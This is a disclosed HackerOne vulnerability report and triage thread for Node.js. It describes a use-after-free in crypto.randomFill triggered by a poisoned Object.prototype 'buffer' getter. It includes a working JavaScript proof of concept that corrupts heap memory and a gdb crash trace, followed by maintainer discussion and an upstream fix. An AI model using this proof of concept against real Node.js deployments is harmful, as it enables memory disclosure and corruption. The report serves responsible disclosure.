{
    "id": 340053,
    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDAwNTM=",
    "url": "https://hackerone.com/reports/340053",
    "title": "Use After Free in crypto.randomFill",
    "state": "Closed",
    "substate": "informative",
    "readable_substate": "Informative",
    "created_at": "2018-04-18T12:38:05.607Z",
    "submitted_at": "2018-04-18T12:38:05.607Z",
    "is_member_of_team?": false,
    "is_organization_group_member?": false,
    "reporter": {
        "disabled": false,
        "username": "tunz",
        "url": "/tunz",
        "profile_picture_urls": {
            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "is_me?": false,
        "cleared": false,
        "verified": false,
        "hackerone_triager": false,
        "hacker_mediation": false
    },
    "team": {
        "id": 22984,
        "url": "https://hackerone.com/nodejs",
        "handle": "nodejs",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "permissions": [],
        "submission_state": "open",
        "default_currency": "usd",
        "awards_miles": false,
        "offers_bounties": true,
        "state": "public_mode",
        "only_cleared_hackers": false,
        "pentest_feature_enabled?": false,
        "profile": {
            "name": "Node.js",
            "twitter_handle": "nodejs",
            "website": "https://nodejs.org",
            "about": "The Node.js JavaScript Runtime"
        }
    },
    "has_bounty?": false,
    "in_validation?": false,
    "can_view_team": true,
    "can_view_report": true,
    "is_external_bug": false,
    "is_published": false,
    "is_participant": false,
    "has_collaborators": false,
    "submitted_by_team_member": false,
    "stage": 4,
    "public": true,
    "visibility": "full",
    "cve_ids": [],
    "singular_disclosure_disabled": true,
    "disclosed_at": "2020-01-15T02:00:32.927Z",
    "bug_reporter_agreed_on_going_public_at": "2020-01-15T02:00:32.891Z",
    "team_member_agreed_on_going_public_at": "2020-01-14T23:48:27.884Z",
    "comments_closed?": false,
    "facebook_team?": false,
    "team_private?": false,
    "vulnerability_information": "**Summary:**\n\nWe can trigger Use-After-Free while running crypto.randomFill, so we can easily read/write heap memory using a typed array pointing a freed backing store.\n\n**Description:**\n\nSee this `node_crypto.cc` code.\n```pp\nvoid RandomBytesBuffer(const FunctionCallbackInfo<Value>& args) {\n...\n  char* data = Buffer::Data(args[0]); // <------------ Get a backing store from a given argument.\n  data += offset;\n\n  std::unique_ptr<RandomBytesRequest> req(\n      new RandomBytesRequest(env,\n                             obj,\n                             size,\n                             data,     // <--------------------- Store the data to req\n                             RandomBytesRequest::DONT_FREE_DATA));\n...\n  } else {\n    Local<Value> argv[2];\n    RandomBytesProcessSync(env, std::move(req), &argv); // <---- This calls RandomBytesCheck\n...\n```\n\n```pp\nvoid RandomBytesCheck(RandomBytesRequest* req, Local<Value> (*argv)[2]) {\n...\n    char* data = nullptr;\n    size_t size;\n    req->return_memory(&data, &size);\n    (*argv)[0] = Null(req->env()->isolate());\n    Local<Value> buffer =\n        req->object()->Get(req->env()->context(),\n                           req->env()->buffer_string()).ToLocalChecked(); // <----- We can return a non-buffer object here by modifying Object.prototype getter.\n\n    if (buffer->IsArrayBufferView()) {\n      ...\n    } else {\n      (*argv)[1] = Buffer::New(req->env(), data, size) // <------- This creates a Buffer with the backing store of a given argument Buffer.\n          .ToLocalChecked();\n...\n```\n\nAs a result, two buffers are sharing a backing store, so this triggers use-after-free if one of the buffers are freed by gc.\n\n## Steps To Reproduce:\n\nExecute the following code.\n\n```js\nconst crypto = require('crypto');\n\nObject.defineProperty(Object.prototype, \"buffer\", {\n  get: function() {\n    return {}; // Return a non-buffer.\n  }, set: function(v) {\n  }\n});\n\nlet size = 100000;\nlet ta = new Uint8Array(size);\ncrypto.randomFillSync(ta, 0, size);\n\n// Actually we don't need this part, this makes a buffer free and crashes just for PoC\nlet arr_size = 10000;\nlet arrs = new Array(arr_size);\nfor (let i = 0; i <arr_size; i++) {\n  let tmp = new Array(0x500);\n  arrs[i] = tmp;\n}\n\n// Just overwrites heap memory space to 0x41\nfor (let i = 0; i < size; i++) {\n  ta[i] = 0x41;\n}\n```\n\n```\n$ ./out/Release/node --version\nv9.11.1\n$ gdb -q --args ./out/Release/node randombytes.js\nReading symbols from ./out/Release/node...r\ndone.\n(gdb) r\nStarting program: /.../ randombytes.js\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7fcd52464700 (LWP 34515)]\n[New Thread 0x7fcd51c63700 (LWP 34516)]\n[New Thread 0x7fcd51462700 (LWP 34520)]\n[New Thread 0x7fcd50c61700 (LWP 34522)]\n[New Thread 0x7fcd5391d700 (LWP 34529)]\n\nThread 1 \"node\" received signal SIGSEGV, Segmentation fault.\n_int_malloc (av=av@entry=0x7fcd52829b20 <main_arena>, bytes=bytes@entry=8192) at malloc.c:3567\n3567    malloc.c: No such file or directory.\n(gdb) x/i $pc\n=> 0x7fcd524e6f04 <_int_malloc+900>:    mov    rdx,QWORD PTR [rax+0x8]\n(gdb) i r rax\nrax            0x4141414141414141       4702111234474983745\n(gdb)\n```\n\nI've tested this in node v9.11.1 built with clang in Ubuntu 16.04.3, and also reproducible in the master branch at the time of writing this report.\n\n## Impact\n\nThis vulnerability could lead to Remote Code Execution.",
    "weakness": {
        "id": 50,
        "name": "Use After Free"
    },
    "original_report_id": null,
    "original_report_url": null,
    "attachments": [],
    "allow_singular_disclosure_at": null,
    "vote_count": 2,
    "voters": [
        "johndoe1492",
        "exd0tpy"
    ],
    "structured_scope": {
        "databaseId": 666,
        "asset_type": "SOURCE_CODE",
        "asset_identifier": "https://github.com/nodejs/node",
        "max_severity": "critical"
    },
    "abilities": {
        "assignable_team_members": [],
        "assignable_team_member_groups": []
    },
    "activities": [
        {
            "id": 2628426,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hey @tunz , Thanks for reporting this. Someone will look at this shortly!",
            "automated_response": false,
            "created_at": "2018-04-18T13:21:48.144Z",
            "updated_at": "2018-04-18T13:21:48.144Z",
            "actor": {
                "username": "vdeturckheim",
                "cleared": false,
                "verified": false,
                "url": "/vdeturckheim",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2628654,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugTriaged",
            "message": "Looks legitimate and I can reproduce. What I'm not yet sure about is whether we would consider this a security issue vs. a regular bug (the difference lies in how/when we disclose publicly.",
            "automated_response": false,
            "created_at": "2018-04-18T14:52:51.396Z",
            "updated_at": "2018-04-18T14:52:51.396Z",
            "actor": {
                "username": "jasnell",
                "cleared": false,
                "verified": false,
                "url": "/jasnell",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2629449,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Thanks for triaging!\n\nI'm just curious what your team's criteria on security bugs is. I mean, what is \"user input\" for vulnerabilities? As you know, we can just execute arbitrary commands with just the built-in child_process module. So, we usually don't execute untrusted code directly. But, what if a web service contains vulnerable codes like this report and take user inputs to run them?\n\nFor example, Let's assume that a web server is providing a service to run the following function, and users are able to provide only 1 or 0 as inputs.\n```js\nfunction not_vuln_maybe(user_input) {\n   if (user_input === 0) {\n      define \"buffer\" of Object.prototype\n   } else {\n      let ta = new Uint8Array(1000);\n      crypto.randomFillSync(ta, 0, 1000);\n      ...\n      send_output(ta);\n   }\n}\n```\nI know it's quite unrealistic, it's just for example. anyway, the author of the web server cannot recognize that this code could be vulnerable, and remote users can access this server and take memory values of the server.\n\nI was also very confused if it's really a security bug, but I think all of memory corruption bugs that can control any register or disclose memory values are security bugs. It would be very helpful if you provide a definition of security bugs for node.js in detail.\n\nThanks!",
            "automated_response": false,
            "created_at": "2018-04-18T16:42:17.338Z",
            "updated_at": "2018-04-18T16:42:17.338Z",
            "actor": {
                "username": "tunz",
                "cleared": false,
                "verified": false,
                "url": "/tunz",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2630902,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "While individual opinions may vary, the difference tends to fall on (1) what level of access is required to trigger the issue and (2) what is required to mitigate the issue. In this case, the issue can be mitigated through careful work on the part of the developer and it would be difficult for an attacker to leverage the vulnerability without help from an uncareful developer :-)\n\nEither way, I think this definitely qualifies as something we want to fix, but in order for it to be a security vulnerability that we would handle under our embargoed disclosure process my intuition tells me it does not quite reach the standard.\n\nOthers on the security triage team may have other opinions on it tho :-)",
            "automated_response": false,
            "created_at": "2018-04-19T00:44:02.664Z",
            "updated_at": "2018-04-19T00:44:02.664Z",
            "actor": {
                "username": "jasnell",
                "cleared": false,
                "verified": false,
                "url": "/jasnell",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2635728,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "I agree with you that individual opinions vary, but I just want your team to define a threat model so that we can avoid inconsistency depending on the individuals :)\n\nI think the \"uncareful developer\" is ambiguous because I'm not sure if we can say that defining a \"buffer\" property to Object.prototype is really an uncareful behavior or not. I agree that this is not very common and this could be a low severity issue, but still it's a security issue in my opinion. ",
            "automated_response": false,
            "created_at": "2018-04-19T07:59:58.410Z",
            "updated_at": "2018-04-19T07:59:58.410Z",
            "actor": {
                "username": "tunz",
                "cleared": false,
                "verified": false,
                "url": "/tunz",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2696142,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Any updates?",
            "automated_response": false,
            "created_at": "2018-05-03T10:56:50.087Z",
            "updated_at": "2018-05-03T10:56:50.087Z",
            "actor": {
                "username": "tunz",
                "cleared": false,
                "verified": false,
                "url": "/tunz",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2815509,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Kindly ping. It's been over a month.",
            "automated_response": false,
            "created_at": "2018-05-30T07:24:36.737Z",
            "updated_at": "2018-05-30T07:24:36.737Z",
            "actor": {
                "username": "tunz",
                "cleared": false,
                "verified": false,
                "url": "/tunz",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2867806,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "@tunz I'm pinging our internal security team again to reach consensus on this, hoping to have an answer for you in less than 72 hours. Thanks for your patience",
            "automated_response": false,
            "created_at": "2018-06-11T12:56:53.680Z",
            "updated_at": "2018-06-11T12:56:53.680Z",
            "actor": {
                "username": "mylesborins",
                "cleared": false,
                "verified": false,
                "url": "/mylesborins",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/234/978/b951e9a05b9f7c327b55bd697d5bd52293856002_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2904001,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "seems like it's fixed by https://github.com/nodejs/node/commit/078bb0f0a0ef3fef2eee93fb1b6be117f6e93ef6",
            "automated_response": false,
            "created_at": "2018-06-19T01:29:42.257Z",
            "updated_at": "2018-06-19T01:29:42.257Z",
            "actor": {
                "username": "tunz",
                "cleared": false,
                "verified": false,
                "url": "/tunz",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 2932068,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugInformative",
            "message": "Fixed upstream.\n\nThank you for reporting!",
            "automated_response": false,
            "created_at": "2018-06-25T17:26:52.606Z",
            "updated_at": "2018-06-25T17:26:52.606Z",
            "actor": {
                "username": "mylesborins",
                "cleared": false,
                "verified": false,
                "url": "/mylesborins",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/234/978/b951e9a05b9f7c327b55bd697d5bd52293856002_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 6772369,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-01-14T23:48:27.906Z",
            "updated_at": "2020-01-14T23:48:27.906Z",
            "first_to_agree": true,
            "actor": {
                "username": "octetcloud",
                "cleared": false,
                "verified": false,
                "url": "/octetcloud",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 6772929,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-01-15T02:00:32.905Z",
            "updated_at": "2020-01-15T02:00:32.905Z",
            "actor": {
                "username": "tunz",
                "cleared": false,
                "verified": false,
                "url": "/tunz",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 6772930,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ReportBecamePublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-01-15T02:00:32.941Z",
            "updated_at": "2020-01-15T02:00:32.941Z",
            "actor": {
                "username": "tunz",
                "cleared": false,
                "verified": false,
                "url": "/tunz",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        }
    ],
    "activity_page_count": 1,
    "activity_page_number": 1,
    "summaries": [
        {
            "category": "team",
            "can_view?": true,
            "can_create?": false
        },
        {
            "category": "researcher",
            "can_view?": true,
            "can_create?": false
        }
    ]
}